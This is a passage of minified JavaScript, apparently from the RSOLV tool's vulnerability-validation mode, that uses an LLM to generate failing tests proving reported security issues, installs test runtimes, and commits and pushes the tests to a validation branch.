Set,this.phaseDataClient=X.rsolvApiKey?new R4(X.rsolvApiKey):null,this.testIntegrationClient=X.rsolvApiKey?new KV(X.rsolvApiKey):null,this.registryClient=X.rsolvApiKey?new D7(X.rsolvApiKey):null,X.environmentVariables&&typeof X.environmentVariables==="object")Object.entries(X.environmentVariables).forEach(([J,Y])=>{if(typeof Y==="string")process.env[J]=Y,V.debug(`Applied environment variable: ${J}`)});this.loadFalsePositiveCache()}async loadProjectShapeForFrameworkDetection(X){if(!this.phaseDataClient)return;try{let Q=this.getCurrentCommitHash(),J=X.repository.fullName,W=await this.phaseDataClient.retrievePhaseResults(J,X.number,Q),G=[];if(Array.isArray(W?.project_shapes)&&W.project_shapes.length>0)G=W.project_shapes;else if(W?.project_shape)G=[W.project_shape];if(G.length>0){let H=G.map(($)=>$.ecosystem).filter(Boolean);this.projectEcosystems=H,V.debug(`[RFC-101] Pre-loaded ${H.length} ecosystem(s) for framework detection: ${H.join(", ")}`)}}catch(Q){V.debug(`[RFC-101] Could not pre-load project shape for framework detection: ${Q}`)}}async validateVulnerability(X,Q){let J=process.env.RSOLV_TESTING_MODE==="true",Y=this.config.executableTests??!0;if(V.info(`[VALIDATION MODE] Starting validation for issue #${X.number}`),J)V.info("[VALIDATION MODE] \uD83E\uDDEA TESTING MODE ENABLED - Will not filter based on test results");let W=WG(X);if(V.info("[VALIDATION MODE] Extracted vulnerabilities from issue",{issueNumber:X.number,vulnerabilitiesCount:W.length,files:W.map((G)=>G.file)}),!Y)return V.info("[VALIDATION MODE] Executable tests disabled - skipping validation"),{issueId:X.number,validated:!0,vulnerabilities:W,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};try{this.ensureCleanGitState();let G=await BG.checkForVendorFiles(X);if(G.isVendor)return V.info(`Issue #${X.number} affects vendor files - marking as VENDORED`),{issueId:X.number,validated:!1,vendoredFile:!0,falsePositiveReason:"Vulnerability in vendor file - requires library update",affectedVendorFiles:G.files,vulnerabilities:W,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};let H=this.getCacheKey(X);if(this.falsePositiveCache.has(H)&&!process.env.RSOLV_SKIP_CACHE)return V.info(`Issue #${X.number} is in false positive cache, skipping`),{issueId:X.number,validated:!1,falsePositiveReason:"Previously identified as false positive",vulnerabilities:W,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};let $;if(Q)V.info(`[VALIDATION MODE] Using prior analysis for issue #${X.number} (skipping analyzeIssue)`),$=Q;else V.info(`Analyzing issue #${X.number} for validation`),$=await Q8(X,this.config);if(!$.canBeFixed)return V.warn(`Issue #${X.number} cannot be validated: ${$.cannotFixReason}`),{issueId:X.number,validated:!1,falsePositiveReason:$.cannotFixReason||"Analysis determined issue cannot be fixed",vulnerabilities:W,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};if(V.info(`[RFC-060-AMENDMENT-001] Starting framework-native test generation for issue #${X.number}`),!this.testIntegrationClient)throw Error("TestIntegrationClient not initialized  RSOLV API key required for validation");await this.loadProjectShapeForFrameworkDetection(X);let z=W[0]?.file||$.filesToModify?.[0]||"",U=await this.detectFrameworkWithBackend(z),K=this.detectFrameworkFromPath(z.replace(/\.(js|ts|rb|py|java|php|ex|exs)$/,".test.$1"));if(V.info(`Detected framework: ${U} for ${z}`),this.noTestFrameworkAvailable)return V.error(`[RFC-103] Cannot validate issue #${X.number}: project has no test framework (only stdlib libraries available)`),V.error("[RFC-103] Validation requires a test framework (e.g., jest, vitest, pytest, rspec, phpunit, junit)"),{issueId:X.number,validated:!1,falsePositiveReason:"Project has no test framework installed  cannot run validation tests",noTestFramework:!0,vulnerabilities:W,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};let B=await this.scanTestFiles(U);V.info(`Found ${B.length} test files in repository`);let q=W[0],Z="";if(q&&z)try{let d=W0.resolve(this.repoPath,z);if(a1.existsSync(d)){let Q1=a1.readFileSync(d,"utf8");if(q.enclosingFunction){let{startLine:V1,endLine:D1}=q.enclosingFunction;Z=Q1.split(`
`).slice(V1-1,D1).join(`
`),V.info(`Using enclosing function '${q.enclosingFunction.name}' (lines ${V1}-${D1}) as context`)}else Z=Q1,V.info("No enclosing function available, using full file as context")}}catch(d){V.warn(`Could not read vulnerable file ${z}: ${d}`)}let M,L=this.detectLanguage(z);if(this.projectEcosystems.length>0&&!this.projectEcosystems.includes(L)){V.info(`[RFC-103] Cross-ecosystem validation: ${L} file in ${this.projectEcosystems.join("/")} project`),V.info(`[RFC-103] Creating new ${U} test file (not reusing existing ${this.projectEcosystems.join("/")} test files)`);let V1=`${{mocha:"test/unit",jest:"__tests__",vitest:"__tests__",rspec:"spec",pytest:"tests",phpunit:"tests",exunit:"test",junit5:"src/test/java",junit4:"src/test/java",testng:"src/test/java"}[U]||"__tests__"}/${this.getTestFileName(U)}`;M={path:V1,content:"",framework:U},V.info(`[RFC-103] Cross-ecosystem test file: ${V1}`)}else if(B.length>0)try{let d=await this.testIntegrationClient.analyze({vulnerableFile:z,vulnerabilityType:q?.type||X.title,candidateTestFiles:B,framework:U}),Q1=null,V1="",D1=d.recommendations||[];for(let n of D1){let t=W0.join(this.repoPath,n.path),u=a1.existsSync(t)?a1.readFileSync(t,"utf8"):"",E=this.detectFrameworkFromContent(u);if(E&&this.isE2EFramework(E)){V.info(`[VALIDATION MODE] Skipping E2E target: ${n.path} (detected: ${E})`);continue}if(E&&E!==U&&!this.isE2EFramework(E))V.info(`[VALIDATION MODE] Target framework override: ${U}  ${E} (from ${n.path})`),U=E;Q1=n.path,V1=u,V.info(`Backend recommended target: ${n.path} (score: ${n.score})`);break}if(!Q1)for(let n of B){let t=W0.join(this.repoPath,n),u=a1.existsSync(t)?a1.readFileSync(t,"utf8"):"",E=this.detectFrameworkFromContent(u);if(E&&this.isE2EFramework(E)){V.info(`[VALIDATION MODE] Skipping E2E candidate: ${n} (detected: ${E})`);continue}if(Q1=n,V1=u,E&&E!==U)U=E;break}if(Q1)M={path:Q1,content:V1,framework:U};else V.info("[VALIDATION MODE] All candidate test files are E2E frameworks  creating new unit test file"),M={path:`${{mocha:"test/unit",jest:"__tests__",vitest:"__tests__",rspec:"spec",pytest:"tests",phpunit:"tests",exunit:"test"}[U]||"test/unit"}/${this.getTestFileName(U)}`,content:"",framework:U}}catch(d){V.warn(`Backend analyze failed, using first non-E2E test file: ${d}`);let Q1=null,V1="";for(let D1 of B){let n=W0.join(this.repoPath,D1),t=a1.existsSync(n)?a1.readFileSync(n,"utf8"):"",u=this.detectFrameworkFromContent(t);if(u&&this.isE2EFramework(u))continue;Q1=D1,V1=t;break}if(Q1)M={path:Q1,content:V1,framework:U};else M={path:`test/unit/${this.getTestFileName(U)}`,content:"",framework:U}}else{let V1=`${{mocha:"test/unit",jest:"__tests__",vitest:"__tests__",rspec:"spec",pytest:"tests",phpunit:"tests",exunit:"test",junit:"src/test/java",junit4:"src/test/java",junit5:"src/test/java",testng:"src/test/java"}[U]||"test"}/${this.getTestFileName(U)}`;V.info(`No test files found  using fallback path: ${V1}`),M={path:V1,content:"",framework:U}}let j={type:q?.type||"unknown",description:q?.description||X.title,location:`${z}:${q?.line||0}`,attackVector:q?.type||"unknown",vulnerablePattern:Z.slice(0,2000),source:z,cweId:q?.cweId};try{if(this.phaseDataClient){let d=this.getCurrentCommitHash(),Q1=X.repository.fullName,D1=await this.phaseDataClient.retrievePhaseResults(Q1,X.number,d),n=[];if(Array.isArray(D1?.project_shapes)&&D1.project_shapes.length>0)n=D1.project_shapes;else if(D1?.project_shape)n=[D1.project_shape];if(n.length>0){let t=n.map((g)=>g.ecosystem).filter(Boolean),u=n.reduce((g,H1)=>g+(H1.runtime_services?.length??0),0);V.info(`[RFC-101] Project shape detected: ${t.length} ecosystem(s): ${t.join(", ")}, ${u} total service deps`),this.projectEcosystems=t;let E=n.map((g)=>g.ai_context||"").filter(Boolean);this.projectAiContext=E.join(`

`);let y={};for(let g of n)if(g.env&&typeof g.env==="object")Object.entries(g.env).forEach(([H1,z1])=>{if(typeof z1==="string")y[H1]=z1});let a=Object.keys(y);if(a.length>0){for(let[g,H1]of Object.entries(y))process.env[g]=H1;V.info(`[RFC-101] Applied ${a.length} env var(s) from project shape`)}let I=n.flatMap((g)=>g.setup_commands||[]);if(I.length>0){let g={};for(let[H1,z1]of Object.entries({...process.env,...y}))if(z1!==void 0)g[H1]=z1;this.deferredSetupCommands=I.map((H1)=>({cmd:H1,env:g})),V.info(`[RFC-101] Deferred ${this.deferredSetupCommands.length} setup command(s) until after runtime installation`)}for(let g of n)if(g.runtime_version&&typeof g.runtime_version==="string"){process.env.RSOLV_RUNTIME_VERSION=g.runtime_version,process.env.RSOLV_RUNTIME_VERSION_SOURCE=g.runtime_version_source||"platform",V.info(`[RFC-112] Runtime version from platform: ${g.runtime_version} (source: ${g.runtime_version_source})`);break}for(let g of n){let H1=g.framework_versions;if(H1&&Object.keys(H1).length>0){let z1=Object.entries(H1).map(([P1,j1])=>`${P1} ${j1}.x`).join(", ");this.projectAiContext+=`

Framework versions detected: ${z1}. Generate tests compatible with these specific versions.`,V.info(`[RFC-112] Framework versions added to AI context: ${z1}`);break}}let v=n.flatMap((g)=>Array.isArray(g.system_packages)?g.system_packages:[]).filter((g,H1,z1)=>z1.indexOf(g)===H1);if(v.length>0)this.systemPackagesToInstall=v,V.info(`[RFC-112] System packages to install: ${v.join(", ")}`)}}}catch(d){V.warn(`[RFC-101] Project shape retrieval warning: ${d instanceof Error?d.message:String(d)}`)}if(process.env.RSOLV_RUNTIME_VERSION==="2")return V.warn("[RFC-112] Python 2 project detected  skipping VALIDATE (Python 2 EOL)"),delete process.env.RSOLV_RUNTIME_VERSION,delete process.env.RSOLV_RUNTIME_VERSION_SOURCE,{issueId:X.number,validated:!1,infrastructureFailure:!0,falsePositiveReason:"Python 2 project  not supported for automated validation",vulnerabilities:W,cweId:j?.cweId,framework:U,retryCount:0,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};V.info("Generating RED test with retry loop...");let F=await this.generateTestWithRetry(j,M,4);if(!F){let d=this.lastFailureIsInfrastructure||this.lastFailureClassificationType&&fU({type:this.lastFailureClassificationType,isValidFailure:!1,reason:""});if(d)V.warn(`Failed to validate issue #${X.number} due to infrastructure limitation (${this.lastFailureClassificationType})`);else V.warn(`Failed to generate valid RED test after retries for issue #${X.number}`);return{issueId:X.number,validated:!1,falsePositiveReason:"Unable to generate valid RED test after 4 attempts",infrastructureFailure:d||void 0,vulnerabilities:W,cweId:j?.cweId,framework:U,retryCount:this.lastRetryCount||4,classificationSource:this.lastClassificationSource,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()}}let A=F.redTests[0]?.testCode||"",O=j?.cweId,N=F.redTests[0]?._classificationResult||(this.registryClient?await this.registryClient.classifyTest(A,O):null),C=N?.is_static===!0&&N?.static_acceptable!==!0;if(N)if(C)V.info(`[RFC-103] Platform classified test as static (not acceptable for ${O||"unknown CWE"}): ${N.reason}`);else if(N.is_static&&N.static_acceptable)V.info(`[RFC-103] Platform classified test as static (acceptable for ${O}): ${N.reason}`);else V.info(`[RFC-103] Platform classified test as behavioral: ${N.reason}`);else V.info("[RFC-103] Platform classification unavailable  accepting test as-is");V.info(` RED test generated: ${F.testFile} (framework: ${F.framework})`),V.info("Creating validation branch for test persistence");let _=null;try{_=await this.createValidationBranch(X);let d=F.testFile,Q1=F.redTests[0]?.testCode||"",V1=!1;try{let n=await this.integrateTestsWithBackendRetry(F,X,M);if(d=n.targetFile,Q1=n.content,this.isBackendErrorContent(Q1))V.warn("AST integration returned error content, treating as failure"),Q1=F.redTests[0]?.testCode||"";else V1=!0,V.info(`AST integration succeeded: ${d}`)}catch(n){V.warn(`AST integration failed: ${n}`)}if(!V1){let n=W0.join(this.repoPath,d);if(a1.existsSync(n)){let t=W0.extname(d),u=W0.dirname(d),E=`vulnerability_validation_issue_${X.number}${t}`;d=W0.join(u,E),V.info(`Target file exists, creating new file: ${d}`)}}let D1=W0.join(this.repoPath,d);a1.mkdirSync(W0.dirname(D1),{recursive:!0}),a1.writeFileSync(D1,Q1,"utf8"),n0('git config user.email "rsolv-validation@rsolv.dev"',{cwd:this.repoPath}),n0('git config user.name "RSOLV Validation Bot"',{cwd:this.repoPath}),n0(`git add "${d}"`,{cwd:this.repoPath}),n0(`git commit -m "Add RED test proving vulnerability for issue #${X.number}"`,{cwd:this.repoPath}),V.info(` Tests committed to validation branch: ${_} (file: ${d})`);try{let n=process.env.GITHUB_TOKEN||process.env.GH_PAT;if(n&&process.env.GITHUB_REPOSITORY){let[t,u]=process.env.GITHUB_REPOSITORY.split("/"),E=`https://x-access-token:${n}@github.com/${t}/${u}.git`;try{n0(`git remote set-url origin ${E}`,{cwd:this.repoPath})}catch(y){V.debug("Could not configure authenticated remote")}}n0(`git push -f origin ${_}`,{cwd:this.repoPath}),V.info(`Pushed validation branch ${_} to remote`)}catch(n){V.warn(`Could not push validation branch to remote: ${n}`)}}catch(d){V.warn(`Could not create validation branch: ${d}`)}let h={passed:!1,output:this.lastTestOutput||"RED test failed on vulnerable code  vulnerability proven",stderr:this.lastTestStderr||"",timedOut:!1,exitCode:1,framework:F.framework,testFile:F.testFile},o=WN(this.lastTestOutput||""),p={passed:o.passed,failed:o.failed||F.redTests.length,total:o.total||F.redTests.length,output:this.lastTestOutput||"No test output captured",exitCode:1},e=N?N.is_static?"static":"behavioral":void 0;if(C)return V.info("[RFC-103] Static analysis detected vulnerability pattern but could not prove exploitability via behavioral test"),V.info("[RFC-103] Marking validation-inconclusive (pattern found, exploitability not proven)"),await this.addGitHubLabel(X,"rsolv:validation-inconclusive"),await this.storeTestExecutionInPhaseData(X,h,!1,_||void 0,W),{issueId:X.number,validated:!1,validationInconclusive:!0,testType:e,branchName:_||void 0,redTests:F,testResults:p,testExecutionResult:h,vulnerabilities:W,cweId:O,framework:U,retryCount:this.lastRetryCount,classificationSource:this.lastClassificationSource,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()};return V.info(" Vulnerability validated! RED tests failed as expected"),await this.addGitHubLabel(X,"rsolv:validated"),await this.storeTestExecutionInPhaseData(X,h,!0,_||void 0,W),{issueId:X.number,validated:!0,testType:e,branchName:_||void 0,redTests:F,testResults:p,testExecutionResult:h,vulnerabilities:W,cweId:O,framework:U,retryCount:this.lastRetryCount,classificationSource:this.lastClassificationSource,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()}}catch(G){return V.error(`Validation failed for issue #${X.number}:`,G),{issueId:X.number,validated:!1,falsePositiveReason:`Validation error: ${G}`,vulnerabilities:W,timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitHash()}}}async validateBatch(X){V.info(`[VALIDATION MODE] Validating batch of ${X.length} issues`);let Q=[];for(let W of X){let G=await this.validateVulnerability(W);if(Q.push(G),X.indexOf(W)<X.length-1)await new Promise((H)=>setTimeout(H,2000))}let J=Q.filter((W)=>W.validated).length,Y=Q.filter((W)=>!W.validated).length;return V.info("[VALIDATION MODE] Batch complete:"),V.info(`  - Validated: ${J}`),V.info(`  - False positives: ${Y}`),Q}async createValidationBranch(X){let Q=`rsolv/validate/issue-${X.number}`;try{return n0(`git checkout -b ${Q}`,{cwd:this.repoPath}),V.info(`Created validation branch: ${Q}`),Q}catch(J){throw V.error(`Failed to create validation branch ${Q}:`,J),J}}convertToExecutableTest(X){if(typeof X==="string")return this.sanitizeTestStructure(X);if(!X||typeof X!=="object")return`describe('Vulnerability Test', () => {
  it('validates vulnerability', () => {
    // ${String(X)}
    expect(true).toBe(true);
  });
});
`;let Q=X;if(Array.isArray(Q.redTests))return`describe('Vulnerability Validation Tests', () => {
${Q.redTests.map((Y,W)=>{let G=Y.testName||`Test ${W+1}`,H=Y.testCode||"expect(true).toBe(true);";if(this.hasFrameworkStructure(H))return this.indentCode(H,2);return`  it('${this.escapeTestName(G)}', () => {
${this.indentCode(H,4)}
  });`}).join(`

`)}
});
`;if(Q.red&&typeof Q.red==="object"){let J=Q.red,Y=J.testCode||"expect(true).toBe(true);";if(this.hasFrameworkStructure(Y))return Y;let W=J.testName||"Vulnerability Test";return`describe('Vulnerability Validation Tests', () => {
  it('${this.escapeTestName(W)}', () => {
${this.indentCode(Y,4)}
  });
});
`}if(Array.isArray(Q.tests))return`describe('Vulnerability Validation Tests', () => {
${Q.tests.map((Y,W)=>{let G=Y.testCode||"expect(true).toBe(true);";if(this.hasFrameworkStructure(G))return this.indentCode(G,2);return`  it('Test ${W+1}', () => {
${this.indentCode(G,4)}
  });`}).join(`

`)}
});
`;return V.warn("Unknown test content format, creating minimal test wrapper"),`describe('Vulnerability Validation Tests', () => {
  it('validates vulnerability', () => {
    // Test content could not be properly parsed
    expect(true).toBe(true);
  });
});
`}convertToExecutableTestSanitized(X){let Q=this.convertToExecutableTest(X);return this.sanitizeTestStructure(Q)}sanitizeTestStructure(X){let Q=/\bit\s*\(/.test(X),J=/\btest\s*\(/.test(X);if(!Q)return X;let Y=X.split(`
`),W=[],G=!1,H=0,$=0,z=!1,U=0,K=!1;for(let B of Y){let q=(B.match(/\{/g)||[]).length,Z=(B.match(/\}/g)||[]).length;if(/^\s*it\s*\(/.test(B)&&!G&&!z)G=!0,K=!0,H=$;if(G&&!K&&!z&&/^\s*(test|describe|it)\s*\(/.test(B)){z=!0,U=q-Z,$+=q-Z;continue}if(K=!1,z){if(U+=q-Z,$+=q-Z,U<=0&&/^\s*\}\s*\)\s*;?\s*$/.test(B.trim())){z=!1,U=0;continue}W.push(B);continue}if($+=q-Z,G&&$<=H&&/^\s*\}\s*\)\s*;?\s*$/.test(B.trim()))G=!1;W.push(B)}return W.join(`
`)}hasFrameworkStructure(X){return/\bdescribe\s*\(/.test(X)}escapeTestName(X){return X.replace(/'/g,"\\'").replace(/\n/g," ")}indentCode(X,Q){let J=" ".repeat(Q);return X.trim().split(`
`).map((Y)=>J+Y).join(`
`)}validateTestSyntax(X){try{Function(X)}catch(Q){if(Q instanceof SyntaxError)throw Error(`Invalid JavaScript syntax in generated test: ${Q.message}`)}}async classifyTestResult(X,Q,J){if(this.registryClient)try{let Y=await this.registryClient.classifyTestResult(X,Q,J);if(Y)return this.lastClassificationSource="platform",{type:Y.type,isValidFailure:Y.is_valid_failure,isInfrastructureFailure:Y.is_infrastructure_failure,reason:Y.reason,testCounts:Y.test_counts}}catch(Y){V.warn(`[RFC-103] Platform classifyTestResult failed, falling back to local: ${Y.message}`)}return this.lastClassificationSource="local",jQ(X,Q,J)}async commitTestsToBranch(X,Q,J){try{let Y=await this.integrateTestsWithBackendRetry(X,J),W=Y.targetFile,G=Y.content;V.info(` Backend integration succeeded: ${W}`);let H=W0.join(this.repoPath,W);a1.mkdirSync(W0.dirname(H),{recursive:!0}),a1.writeFileSync(H,G,"utf8"),n0('git config user.email "rsolv-validation@rsolv.dev"',{cwd:this.repoPath}),n0('git config user.name "RSOLV Validation Bot"',{cwd:this.repoPath}),n0(`git add "${W}"`,{cwd:this.repoPath}),n0('git commit -m "Add validation tests for issue"',{cwd:this.repoPath}),V.info(`Committed tests to branch ${Q} (target: ${W})`);try{let $=process.env.GITHUB_TOKEN||process.env.GH_PAT;if($&&process.env.GITHUB_REPOSITORY){let[z,U]=process.env.GITHUB_REPOSITORY.split("/"),K=`https://x-access-token:${$}@github.com/${z}/${U}.git`;try{n0(`git remote set-url origin ${K}`,{cwd:this.repoPath})}catch(B){V.debug("Could not configure authenticated remote")}}n0(`git push -f origin ${Q}`,{cwd:this.repoPath}),V.info(`Pushed validation branch ${Q} to remote`)}catch($){V.warn(`Could not push validation branch to remote: ${$}`)}}catch(Y){throw V.error(`Failed to commit tests to branch ${Q}:`,Y),Y}}async integrateTestsWithBackendRetry(X,Q,J){if(!this.testIntegrationClient)throw Error("TestIntegrationClient not initialized - check API key configuration");for(let G=1;G<=3;G++)try{V.debug(`Backend integration attempt ${G}/3...`);let H,$,z;if(J)H=J.path,$=J.content,z=J.framework,V.info(`Using pre-selected target file: ${H} (framework: ${z})`);else{let q=await this.scanTestFiles();if(q.length===0)throw Error("No test files found in repository");z=await this.detectFrameworkWithBackend(Q?.file||"");let Z=await this.testIntegrationClient.analyze({vulnerableFile:Q?.file||"unknown",vulnerabilityType:Q?.title||"unknown",candidateTestFiles:q,framework:z});if(!Z.recommendations||Z.recommendations.length===0)throw Error("Backend returned no test file recommendations");H=Z.recommendations[0].path,V.info(`Backend recommended target file: ${H} (score: ${Z.recommendations[0].score})`);let M=W0.join(this.repoPath,H);if(!a1.existsSync(M))throw Error(`Recommended target file does not exist: ${H}`);$=a1.readFileSync(M,"utf8")}let U=this.formatTestSuite(X),K=this.detectLanguage(H),B=await this.testIntegrationClient.generate({targetFileContent:$,testSuite:U,framework:z,language:K});if(V.info(`Backend integration succeeded using ${B.method} method`),B.insertionPoint)V.debug(`Insertion point: line ${B.insertionPoint.line}, strategy: ${B.insertionPoint.strategy}`);return{targetFile:H,content:B.integratedContent}}catch(H){if(G===3)throw V.error("Backend integration failed after 3 attempts"),H;if(!this.isRetryableError(H))throw V.error(`Non-retryable error: ${H}`),H;let U=1000*Math.pow(2,G-1);V.warn(`Attempt ${G} failed (${H}), retrying in ${U}ms...`),await new Promise((K)=>setTimeout(K,U))}throw Error("Backend integration failed after all retry attempts")}isRetryableError(X){let Q=String(X).toLowerCase(),J=["timeout","econnrefused","enotfound","network","503","502","504","429"];if(["400","401","403","404","422"].some((W)=>Q.includes(W)))return!1;if(J.some((W)=>Q.includes(W)))return!0;return!0}loadFalsePositiveCache(){try{let X=W0.join(this.repoPath,".rsolv","false-positives.json");if(a1.existsSync(X))JSON.parse(a1.readFileSync(X,"utf8")).entries?.forEach((J)=>{if(J.expiresAt&&new Date(J.expiresAt)<new Date)return;this.falsePositiveCache.add(J.pattern)}),V.info(`Loaded ${this.falsePositiveCache.size} false positive patterns`)}catch(X){V.warn("Could not load false positive cache:",X)}}addToFalsePositiveCache(X){let Q=this.getCacheKey(X);this.falsePositiveCache.add(Q);let J=W0.join(this.repoPath,".rsolv","false-positives.json"),Y=W0.dirname(J);a1.mkdirSync(Y,{recursive:!0});let W=Array.from(this.falsePositiveCache).map((G)=>({pattern:G,timestamp:new Date().toISOString(),expiresAt:new Date(Date.now()+2592000000).toISOString()}));a1.writeFileSync(J,JSON.stringify({entries:W,version:"1.0"},null,2)),V.info(`Added issue #${X.number} to false positive cache`)}getCacheKey(X){return`${X.repository}#${X.number}#${X.title}`}ensureCleanGitState(){try{if(n0("git status --porcelain",{encoding:"utf8"}).trim())throw Error("Repository has uncommitted changes")}catch(X){V.warn("Git state check failed:",X)}}getCurrentCommitHash(){try{return n0("git rev-parse HEAD",{encoding:"utf8"}).trim()}catch{return"unknown"}}async addGitHubLabel(X,Q){try{await v0(this.config).issues.addLabels({owner:X.repository.owner,repo:X.repository.name,issue_number:X.number,labels:[Q]}),V.info(`Added label '${Q}' to issue #${X.number}`)}catch(J){V.warn(`Failed to add label '${Q}' to issue #${X.number}:`,J)}}async storeTestExecutionInPhaseData(X,Q,J,Y,W){if(!this.phaseDataClient){V.debug("PhaseDataClient not available, skipping phase data storage");return}try{await this.phaseDataClient.storePhaseResults("validate",{validate:{[X.number]:{validated:J,branchName:Y,testPath:Q.testFile,testExecutionResult:Q,vulnerabilities:W,timestamp:new Date().toISOString()}}},{repo:X.repository.fullName,issueNumber:X.number,commitSha:this.getCurrentCommitHash()}),V.info(`Stored test execution results in PhaseDataClient for issue #${X.number}`)}catch(G){V.warn("Failed to store test execution in PhaseDataClient:",G)}}async generateTestWithRetry(X,Q,J=3){let Y=[],W=this.frameworkFromName(Q.framework);if(V.info(`Starting test generation with retry (max ${J} attempts)`),V.info(`Vulnerability: ${X.type} at ${X.location}`),V.info(`Target test file: ${Q.path}`),W.name==="generic"){let H=Q.path?.split(".").pop()||"unknown";return V.error(`[RFC-103] No test framework available for ${Q.path} (extension: .${H})`),V.error("[RFC-103] This may be a cross-ecosystem vulnerability or the project lacks test infrastructure"),this.lastFailureClassificationType="command_not_found",this.lastFailureIsInfrastructure=!0,null}let G=Q.framework?.toLowerCase();if(G)try{let{TestRunner:H}=await Promise.resolve().then(() => (QV(),pC)),$=new H;if(V.info(`Ensuring runtime for framework: ${G}`),await $.ensureRuntime(G,this.repoPath),this.systemPackagesToInstall.length>0){let Z=this.systemPackagesToInstall.join(" ");V.info(`[RFC-112] Installing system packages: ${Z}`);try{n0(`apt-get update -qq && apt-get install -y -qq ${Z}`,{cwd:this.repoPath,timeout:120000,encoding:"utf8",env:process.env}),V.info("[RFC-112] System packages installed successfully")}catch(M){V.warn(`[RFC-112] System package install warning: ${M instanceof Error?M.message:String(M)}`)}this.systemPackagesToInstall=[]}if(V.info(`Ensuring dependencies for framework: ${G}`),await $.ensureDependencies(G,this.repoPath),$.bundleInstallFailed&&W.testCommand){if(V.info("[RFC-112] bundle install failed  switching to direct rspec invocation (no bundle exec)"),W.testCommand.includes("bundle exec rspec"))W.testCommand="rspec";else if(W.testCommand.includes("bundle exec ruby"))W.testCommand="ruby -Itest"}V.info("Runtime and dependency setup complete");let U=`${process.env.MISE_DATA_DIR||`${process.env.HOME||"/root"}/.local/share/mise`}/shims`,K=`${process.env.HOME||"/root"}/.local/bin`;if(!process.env.PATH?.includes(U))process.env.PATH=`${U}:${K}:${process.env.PATH||""}`,V.info(`ValidationMode: Added mise shims to PATH: ${U}`);V.info(`PATH after setup (first 300 chars): ${process.env.PATH?.substring(0,300)}`);let q={rspec:"ruby",minitest:"ruby",pytest:"python",phpunit:"php",junit:"java",junit5:"java",junit4:"java",exunit:"elixir",testing:"go"}[G]||"node";try{let Z=n0(`which ${q}`,{encoding:"utf8",env:process.env}).trim();V.info(`Runtime binary '${q}' found at: ${Z}`)}catch{V.warn(`Runtime binary '${q}' not found on PATH after setup`);try{let Z=n0(`ls -la ${U}/${q} 2>/dev/null || echo "NOT_FOUND"`,{encoding:"utf8"}).trim();V.warn(`Shim check: ${Z}`)}catch{}}}catch(H){V.warn(`Runtime/dependency setup warning: ${H instanceof Error?H.message:String(H)}`)}if(this.deferredSetupCommands.length>0){V.info(`[RFC-101] Executing ${this.deferredSetupCommands.length} deferred setup command(s) after runtime installation`);for(let{cmd:H,env:$}of this.deferredSetupCommands)try{n0(H,{cwd:this.repoPath,timeout:60000,encoding:"utf8",env:$}),V.info(`[RFC-101] Setup command succeeded: ${H}`)}catch(z){V.warn(`[RFC-101] Setup command warning: ${H}  ${z instanceof Error?z.message:String(z)}`)}this.deferredSetupCommands=[]}delete process.env.RSOLV_RUNTIME_VERSION,delete process.env.RSOLV_RUNTIME_VERSION_SOURCE;for(let H=1;H<=J;H++){V.info(`Attempt ${H}/${J}: Generating test candidates...`);try{let $=await this.generateTestWithLLM(X,Q,Y,W,this.projectAiContext||void 0),z=$.redTests;V.info(`Generated ${z.length} test candidate(s)`);let U=W0.join(this.repoPath,Q.path);a1.mkdirSync(W0.dirname(U),{recursive:!0});let K=a1.existsSync(U),B=K?a1.readFileSync(U,"utf8"):null,q=()=>{try{if(B!==null)a1.writeFileSync(U,B,"utf8"),V.debug(`Restored original content of ${Q.path}`);else if(!K)a1.unlinkSync(U),V.debug(`Removed generated test file: ${Q.path}`)}catch(F){V.warn(`Failed to restore original file: ${F}`)}},Z=[],M=null;for(let F=0;F<z.length;F++){let A=z[F];V.info(`Trying candidate ${F+1}/${z.length}...`),a1.writeFileSync(U,A.testCode,"utf8");try{await this.validateSyntax(U,W),this.validateTestStructure(U,W),V.info(` Candidate ${F+1}: Syntax and structure validation passed`)}catch(O){V.warn(` Candidate ${F+1}: Validation error:`,O),Z.push({candidateIndex:F,error:"SyntaxError",errorMessage:O instanceof Error?O.message:String(O),generatedCode:A.testCode.slice(0,1500)});continue}try{let O=await this.runTest(U,W,A.testName);if(this.lastTestOutput=O.output,this.lastTestStderr=O.stderr,O.passed){V.warn(` Candidate ${F+1}: Test PASSED (should fail on vulnerable code)`);let N=(O.output||"").slice(-500);V.info(`[Two-Phase] Attempting inversion for candidate ${F+1}...`);let C=await this.invertPassingTest(A.testCode,O.output||"",X,W);if(C){V.info(`[Two-Phase] ORIGINAL TEST (first 800 chars):
${A.testCode.slice(0,800)}`),V.info(`[Two-Phase] INVERTED TEST (first 800 chars):
${C.slice(0,800)}`),a1.writeFileSync(U,C,"utf8"),V.info("[Two-Phase] Testing inverted code...");try{await this.validateSyntax(U,W),this.validateTestStructure(U,W)}catch(h){V.warn(`[Two-Phase] Inverted code validation failed: ${h}`),Z.push({candidateIndex:F,error:"TestPassedUnexpectedly",errorMessage:"Test passed. Inversion attempt had syntax error.",testOutput:N,generatedCode:A.testCode.slice(0,1500)});continue}let _=await this.runTest(U,W,A.testName);if(!_.passed){let h=await this.classifyTestResult(_.exitCode,_.output,_.stderr);if(h.isValidFailure){if(this.registryClient){let p=X.cweId||X.cwe_id,e=W?.name,d=await this.registryClient.classifyTest(C,p,e);if(d?.is_static&&d?.static_acceptable!==!0){V.warn(` [Two-Phase] Inverted test is STATIC  rejected (${d.reason})`),Z.push({candidateIndex:F,error:"StaticTestNotAcceptable",errorMessage:`Inverted test uses static source analysis  not acceptable for ${p||"unknown CWE"}`,generatedCode:C.slice(0,1500),retryGuidance:d.retry_guidance||void 0});continue}}V.info(" [Two-Phase] SUCCESS! Inverted test with genuine assertion failure");let o={...A,testCode:C,testName:`${A.testName}_inverted`};M={...$,redTests:[o]};break}else V.warn(`[Two-Phase] Inverted test failed but not a valid assertion: ${h.type}`)}else V.warn("[Two-Phase] Inverted test still passes  inversion didn't work"),V.info(`[Two-Phase] Inverted test output (last 500 chars): ${(_.output||"").slice(-500)}`)}else V.warn("[Two-Phase] Inversion call 